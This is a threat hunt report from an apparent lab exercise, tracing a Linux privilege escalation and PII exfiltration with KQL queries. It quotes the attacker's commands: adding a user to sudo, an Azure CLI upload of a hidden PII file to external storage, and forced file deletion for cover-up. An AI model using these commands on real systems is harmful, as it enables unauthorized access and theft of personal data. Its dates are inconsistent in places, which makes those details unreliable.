# Threat Hunt Report: Linux, escalation of privileges and data exfiltration 

**Analyst**: Antonio Francisco

**Date Completed:** 10/22/2025



##  Scenario

Company A has been noticing some PII information about employees might be getting leaked because of recent phishing attempts that have been perpetrated. Such information includes address, email address, and phone number. All of this information is stored on a linux server as a hidden file where only the root/sudo users have read and write access. There was a report by another employee the other day of a fellow employee messing with the computer while the root administrator was in the bathroom. The company has decided to investigate this. 


---

## Steps Taken

### 1. Searched the DeviceFileEvents

I searched the `DeviceFileEvents` table for file activity during the suspected incident window. Two suspicious files named `super_secret_script.sh` were observed: one created at `2025-10-21T23:23:50.03483Z` and a later activity at `2025-10-21T23:59:46.704196Z`.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName contains "Iclab"
| where ActionType == "FileCreated"
| order by Timestamp asc
```
<img width="1892" height="755" alt="Screenshot 2025-10-21 220336" src="https://github.com/user-attachments/assets/578c63cd-87c8-42a8-a915-4db6734c006e" />


---

### 2. Suspicious Script Identification

While examining `DeviceFileEvents` for activity during the incident window, two events for `super_secret_script.sh` were observed: The first event at `2025-10-21T23:23:50.03483Z` shows use of the `touch` command (file creation on Linux); the second at `2025-10-21T23:59:46.704196Z` shows `nano` (a command-line editor), indicating the file was opened and modified. 

**Query used to locate event:**

```kql
DeviceFileEvents
| where DeviceName contains "Iclab" and ActionType == "FileCreated"
| where FileName contains "super_secret_script.sh"
| project Timestamp, InitiatingProcessCommandLine
| sort by Timestamp asc
```
<img width="777" height="108" alt="Screenshot 2025-10-21 224709" src="https://github.com/user-attachments/assets/9bf1182e-9c7a-4796-977e-f41f746bf410" />




---

### 3. Privilege Escalation Detection

Following the file modification, the `DeviceProcessEvents` table shows execution of the command `usermod -aG sudo john_bolas`. This command appends the account `john_bolas` to the `sudo` group on Linux systems, effectively granting that account administrative (root) privileges. The occurrence of this command immediately after modification of `super_secret_script.sh` is highly suspicious and consistent with an attacker escalating privileges to establish persistent, privileged access on the host.

```kql
DeviceFileEvents
| where DeviceName contains "Iclab"
| where ActionType == "FileCreated"
| where InitiatingProcessCommandLine contains "usermod"
| project Timestamp, ActionType, DeviceName, InitiatingProcessCommandLine
| order by Timestamp asc
```
<img width="780" height="110" alt="image" src="https://github.com/user-attachments/assets/3b1b25a5-73e3-41e9-b748-f09cc183dc4a" />




---

### 4. Searched the DeviceProcessEvents Table for Script execution and suspected data exfiltration

I searched the DeviceProcessEvents table for evidence of script execution. At `2025-10-22T00:00:41.464697Z` the host executed: `/bin/bash ./super_secret_script.sh`
Immediately following this execution, the `InitiatingProcessCommandLine` contains multiple commands, including an Azure CLI `az storage blob upload` invocation with an account name, key, and container identifier. The presence of an authenticated Azure Storage upload command directly after the script run is strong evidence that data was collected and transmitted to external Azure storage.

```kql
DeviceProcessEvents
| where Timestamp >= datetime(2025-10-21T23:59:46.704196Z)
| where DeviceName contains "Iclab"
| project Timestamp, DeviceName, ActionType, InitiatingProcessCommandLine
| order by Timestamp asc
```
<img width="1823" height="727" alt="Screenshot 2025-10-22 001450" src="https://github.com/user-attachments/assets/e5a1b66b-31e2-45c8-8b96-0bfcb412eed4" />

---

### 5. Searched the DeviceProcessEvents Table for Cleanup

While reviewing the `DeviceProcessEvents` table for post-exfiltration activity, I observed a cleanup command executed at `2025-10-22T00:07:01.760647Z`: `xargs rm -f`. The use of `xargs` piped to `rm -f` is consistent with scripted deletion of one or more files and is likely an attempt to remove super_secret_script.sh and other artifacts to frustrate forensic recovery.

```kql
DeviceProcessEvents
| where Timestamp >= datetime(2025-10-21T23:59:46.704196Z)
| where DeviceName contains "Iclab"
| where InitiatingProcessCommandLine contains "rm"
| project Timestamp, DeviceName, ActionType, InitiatingProcessCommandLine
| order by Timestamp asc
```

<img width="1424" height="555" alt="Screenshot 2025-10-22 014117" src="https://github.com/user-attachments/assets/bea8d30a-d67b-44b8-a86b-da09e1f9ff78" />

---

### 6. DeviceNetworkEvents (network activity analysis)

I reviewed the `DeviceNetworkEvents` table for outbound network connections during and after the script execution window. The analysis revealed network traffic consistent with Azure CLI blob storage activity, confirming a successful external connection to Azure endpoints. These events directly correlate with the previously identified `az storage blob upload` command, reinforcing the conclusion that the attacker successfully transferred data to an external Azure storage account.

```kql
DeviceNetworkEvents
| where DeviceName contains "Iclab"
| where Timestamp >= datetime(2025-10-21T23:59:46.704196Z)
| project Timestamp, ActionType, InitiatingProcessCommandLine
| order by Timestamp asc
```

<img width="1805" height="208" alt="Screenshot 2025-10-22 015755" src="https://github.com/user-attachments/assets/bad7c346-c2c2-4926-accc-b8d23c11f7e1" />

-----
## Chronological Event Timeline 

### 1. Preparation and Script Creation

- Timestamp: 2025-06-16T12:20:50.902852Z
  
- Event: Malicious script file created
  
- Command: touch super_secret_script.sh
 
- File Path: /home/lab12/super_secret_script.sh

- Analysis: Attacker creates empty script file using standard Linux touch command

### 2. Script Development

- Timestamp: 2025-10-21T23:59:46.704196Z

- Event: Script opened and modified

- Command: nano super_secret_script.sh

- File Path: /home/lab12/super_secret_script.sh

- Analysis: Attacker uses nano editor to write malicious code into the script


### 3. Attack Execution

- Timestamp: 2025-10-22T00:00:41.464697Z
  
- Event: Malicious script executed
  
- Command: /bin/bash ./super_secret_script.sh
  
- File Path: /home/lab12/super_secret_script.sh
  
- Analysis: Attacker initiates automated attack sequence

### 4. Privilege Escalation

- Timestamp: 2025-10-22T00:00:42Z
  
- Event: Unauthorized sudo access granted
  
- Command: usermod -aG sudo john_bolas
  
- User Affected: john_bolas
  
- Impact: CRITICAL - Backdoor established for persistent access
  
- Analysis: Script grants sudo privileges to compromised user account

### 5. Data Exfiltration

- Timestamp: 2025-10-22T00:00:44.891322Z
  
- Event: PII data uploaded to external storage
  
- Command: az storage blob upload --account-name chuck --account-key [REDACTED] --container-name chuckcontainer --file /home/lab12/.secret_data1/.pii_file.txt --name test_file
  
- Source File: /home/lab12/.secret_data1/.pii_file.txt (hidden PII file)
  
- Destination: Azure Storage Account "chuck" / Container "chuckcontainer"
  
- Impact: CRITICAL - Sensitive employee PII compromised
  
- Analysis: Azure CLI used to transfer sensitive data to attacker-controlled storage

### 6. Cover-Up

- Timestamp: 2025-10-22T00:07:01.760647Z
  
- Event: Script and evidence removal
  
- Command: xargs rm -f
  
- File Path: /home/lab12/super_secret_script.sh (presumed)
  
- Analysis: Attacker attempts to cover tracks by forcefully deleting malicious script and related files ~6 minutes post-attack


7. Network Confirmation

- Timestamp: 2025-10-22T00:00:45.721694Z
  
- Event: Azure storage connection verified
  
- Action: ConnectionSuccess to Azure services
  
- Analysis: Network logs confirm successful data transmission to Azure Blob Storage


 

---

## Summary

This investigation confirmed a serious internal security breach on the iclab server. An attacker created and executed a malicious script that first established a persistent backdoor by granting the user john_bolas unauthorized sudo privileges. The script then successfully exfiltrated sensitive PII data to an external Azure storage account. Finally, the attacker attempted to cover their tracks by deleting the script to hide the evidence. 


---

## Response Taken

**Immediate Actions**:

- Revoked john_bolas sudo access and credentials

- Isolated the iclab server from the network

- Suspended the compromised account pending management review

**Investigation & Cleanup**:

- Conducted full forensic analysis to confirm script removal

- Audited all user accounts and group memberships across Linux systems

- Restored system from clean, pre-incident backup

**Remediation & Prevention**:

- Rotated all compromised PII and credentials

- Enhanced monitoring for privilege escalation and cloud data transfers

- Initiated additional security awareness training

- Escalated findings to management for further action

---
